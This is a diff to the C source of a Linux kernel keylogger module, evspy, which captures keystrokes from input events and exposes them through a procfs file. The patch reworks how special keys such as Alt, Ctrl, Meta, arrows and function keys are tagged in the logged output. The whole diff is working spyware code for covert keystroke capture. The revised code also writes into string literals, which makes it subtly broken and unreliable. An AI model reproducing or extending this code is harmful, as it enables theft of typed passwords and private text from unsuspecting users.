@@ -29,9 +29,6 @@ static char *wrp;			// write pointer
 static unsigned short int capslock_state = EVS_VAL_FREE;
 static unsigned short int shift = 0;
 
-// This is how special keys will be displayed (+: pressed / -: freed)
-static char sp_tag[] = "<+XXX>";
-
 /*
  * Executed when the procfs file is read (EVS_PROCNAME)
  */
@@ -90,7 +87,7 @@ static int evspy_read_proc(char *page, char **start, off_t offset, int count,
  */
 static void special_char(unsigned int code, unsigned int value)
 {
-	int i;
+	char *sp_tag;
 	int known = 1;
 
 	// We need to know when some special keys are freed; add them here
@@ -101,6 +98,8 @@ static void special_char(unsigned int code, unsigned int value)
 	case KEY_RIGHTALT:
 	case KEY_LEFTCTRL:
 	case KEY_RIGHTCTRL:
+	case KEY_LEFTMETA:
+	case KEY_RIGHTMETA:
 		break;
 	default:
 		if (value == EVS_VAL_FREE)
@@ -113,49 +112,53 @@ static void special_char(unsigned int code, unsigned int value)
 		shift = !shift;
 		return;
 	case KEY_LEFTALT:
-		strncpy(sp_tag+2, "ALT", 3);
+		sp_tag = "[+ALT]";
 		break;
 	case KEY_RIGHTALT:
-		strncpy(sp_tag+2, "AGR", 3);
+		sp_tag = "[+ALTGR]";
 		break;
 	case KEY_LEFTCTRL:
 	case KEY_RIGHTCTRL:
-		strncpy(sp_tag+2, "CTR", 3);
+		sp_tag = "[+CTRL]";
+		break;
+	case KEY_LEFTMETA:
+	case KEY_RIGHTMETA:
+		sp_tag = "[+META]";
 		break;
 	case KEY_TAB:
-		strncpy(sp_tag+2, "TAB", 3);
+		sp_tag = "[TAB]";
 		break;
 	case KEY_ESC:
-		strncpy(sp_tag+2, "ESC", 3);
+		sp_tag = "[ESC]";
 		break;
 	case KEY_UP:
-		strncpy(sp_tag+2, " ^ ", 3);
+		sp_tag = "[UP]";
 		break;
 	case KEY_DOWN:
-		strncpy(sp_tag+2, " v ", 3);
+		sp_tag = "[DOWN]";
 		break;
 	case KEY_LEFT:
-		strncpy(sp_tag+2, " < ", 3);
+		sp_tag = "[LEFT]";
 		break;
 	case KEY_RIGHT:
-		strncpy(sp_tag+2, " > ", 3);
+		sp_tag = "[RIGHT]";
 		break;
 	default:
 		known = 0;
 	}
 
 	if (!known && evs_isfX(code))
-		strncpy(sp_tag+2, "F??", 3);
+		sp_tag = "[+FX]";
 	else if (!known)
 		return;
 
-	if (value == EVS_VAL_PRESS)
+	if (value == EVS_VAL_PRESS && (sp_tag[1] == '+' || sp_tag[1] == '-'))
 		sp_tag[1] = '+';
 	else if (value == EVS_VAL_FREE)
 		sp_tag[1] = '-';
 
-	for (i = 0; i < sizeof(sp_tag) - 1; i++)
-		evs_insert(sp_tag[i]);
+	while (*sp_tag)
+		evs_insert(*sp_tag++);
 }
 
 static void evspy_event(struct input_handle *handle, unsigned int type,
@@ -169,12 +172,13 @@ static void evspy_event(struct input_handle *handle, unsigned int type,
 	if (code == KEY_CAPSLOCK && value == EVS_VAL_PRESS) {
 		special_char(KEY_LEFTSHIFT, capslock_state);
 		return;
-	} else if (type != EV_KEY || unlikely(code >= sizeof(map))) {
+	} else if (type != EV_KEY) {
 		return;
 	}
 
 	// Special/unknown keys (alt, ctrl, esc, shift, etc)
-	if (map[code] == '.' && likely(code != KEY_DOT)) {
+	if (unlikely(code >= sizeof(map)) ||
+			(map[code] == '.' && likely(code != KEY_DOT))) {
 		special_char(code, value);
 
 	// "Direct" keys (alphanumeric + some symbols)
